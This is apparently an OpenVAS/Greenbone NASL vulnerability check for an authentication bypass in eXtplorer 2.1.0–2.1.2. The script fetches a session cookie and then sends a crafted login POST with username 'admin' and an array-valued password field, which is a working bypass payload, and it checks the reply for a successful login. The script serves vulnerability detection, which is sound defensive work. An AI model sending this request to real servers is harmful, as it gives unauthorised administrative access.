CPE = "cpe:/a:extplorer:extplorer";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103639" );
	script_bugtraq_id( 57058 );
	script_version( "$Revision: 11865 $" );
	script_tag( name: "cvss_base", value: "9.7" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:P" );
	script_name( "eXtplorer 'ext_find_user()' Function Authentication Bypass Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/57058" );
	script_xref( name: "URL", value: "http://extplorer.net/" );
	script_tag( name: "last_modification", value: "$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $" );
	script_tag( name: "creation_date", value: "2013-01-10 12:43:09 +0100 (Thu, 10 Jan 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "This script is Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_eXtplorer_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "eXtplorer/installed" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "eXtplorer is prone to an authentication-bypass vulnerability.

Remote attackers can exploit this issue to bypass the authentication
mechanism and gain unauthorized access.

eXtplorer 2.1.2, 2.1.1, and 2.1.0 are vulnerable." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/index.php";
req = http_get( item: url, port: port );
result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(!egrep( pattern: "<title>.*eXtplorer</title>", string: result )){
	exit( 0 );
}
cookie = eregmatch( pattern: "Set-Cookie: eXtplorer=([^; ]+);", string: result );
if(isnull( cookie[1] )){
	exit( 0 );
}
co = cookie[1];
ex = "option=com_extplorer&action=login&type=extplorer&username=admin&password[]=";
len = strlen( ex );
host = http_host_name( port: port );
req = NASLString( "POST ", dir, "/index.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "X-Requested-With: XMLHttpRequest\\r\\n", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\\r\\n", "Content-Length: ", len, "\\r\\n", "Cookie: eXtplorer=", co, "\\r\\n", "Pragma: no-cache\\r\\n", "Cache-Control: no-cache\\r\\n", "\\r\\n", ex );
result = http_send_recv( port: port, data: req, bodyonly: FALSE );
if(ContainsString( result, "'Login successful!" )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

